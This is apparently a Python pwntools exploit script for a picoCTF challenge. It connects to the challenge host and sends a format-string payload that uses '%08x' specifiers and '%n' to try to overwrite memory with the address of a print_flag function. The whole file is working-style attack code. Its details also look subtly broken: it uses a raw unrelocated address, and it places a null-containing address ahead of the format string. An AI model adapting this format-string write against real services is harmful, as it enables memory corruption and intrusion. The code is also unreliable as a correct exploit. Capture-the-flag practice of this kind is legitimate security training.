from pwn import *

# Set up context for 64-bit binary
context.arch = 'amd64'
context.log_level = 'debug'

# Connect to the service
conn = remote('shape-facility.picoctf.net', 65339)

# Address of print_flag function (from disassembly)
print_flag_addr = 0x0000000000001269

# Craft the payload
payload = p64(print_flag_addr)  # Pack the address in 64-bit format
payload += b'%08x.' * 12  # Adjust the number of %08x to align the write
payload += b'%n'  # Write the number of characters printed so far to the address

# Send the payload
conn.sendline(payload)

# Receive the response
response = conn.recvall()
print(response)

# Close the connection
conn.close()
